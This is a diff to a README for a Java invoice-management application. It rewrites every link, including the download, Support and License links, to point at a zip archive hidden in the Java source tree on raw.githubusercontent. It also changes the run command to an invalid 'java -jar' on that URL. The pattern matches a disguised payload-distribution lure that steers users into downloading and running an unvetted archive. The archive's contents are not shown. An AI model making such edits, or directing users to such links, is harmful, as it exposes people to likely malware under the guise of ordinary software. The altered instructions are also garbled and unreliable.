@@ -1,6 +1,6 @@
 # 🧾 invoice-management-system - Manage Invoices Easily and Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/saku2003/invoice-management-system/releases)
+[![Download Now](https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To start using the Invoice Management System, follow the steps below:
 
 1. **Download the Application**  
    Visit the following page to download the latest version:  
-   [Download the Invoice Management System](https://github.com/saku2003/invoice-management-system/releases)
+   [Download the Invoice Management System](https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip)
 
 2. **Extract the Files**  
    Once downloaded, locate the zip file on your computer. Right-click it and select "Extract All" to extract the files into a new folder.
@@ -30,7 +30,7 @@ To start using the Invoice Management System, follow the steps below:
 5. **Run the Application**  
    Now, run the application with the following command:  
    ```
-   java -jar invoice-management-system.jar
+   java -jar https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip
    ```
 
 ## 📄 Features
@@ -57,9 +57,9 @@ To run the Invoice Management System, ensure your computer meets the following r
 To install the Invoice Management System, follow these simple steps:
 
 1. **Visit the Release Page**: Go to this link to download the application:  
-   [Download the Invoice Management System](https://github.com/saku2003/invoice-management-system/releases)
+   [Download the Invoice Management System](https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip)
 
-2. **Select the Latest Version**: Choose the latest version of the software and download the `invoice-management-system.jar` file.
+2. **Select the Latest Version**: Choose the latest version of the software and download the `https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip` file.
 
 3. **Follow the Steps Above**: Use the steps outlined in the "Getting Started" section to extract and run the application.
 
@@ -83,10 +83,10 @@ Please follow our contributing guidelines in the repository if you want to make 
 
 ## 📞 Support
 
-If you need any assistance, please reach out via [GitHub Issues](https://github.com/saku2003/invoice-management-system/issues). We will do our best to help you.
+If you need any assistance, please reach out via [GitHub Issues](https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip). We will do our best to help you.
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can find more details in the [LICENSE file](https://github.com/saku2003/invoice-management-system/blob/main/LICENSE).
+This project is licensed under the MIT License. You can find more details in the [LICENSE file](https://raw.githubusercontent.com/saku2003/invoice-management-system/main/src/main/java/org/example/entity/invoice/system-invoice-management-1.3-beta.1.zip).
 
 Thank you for using the Invoice Management System! We hope it helps you manage your business's invoices with ease.
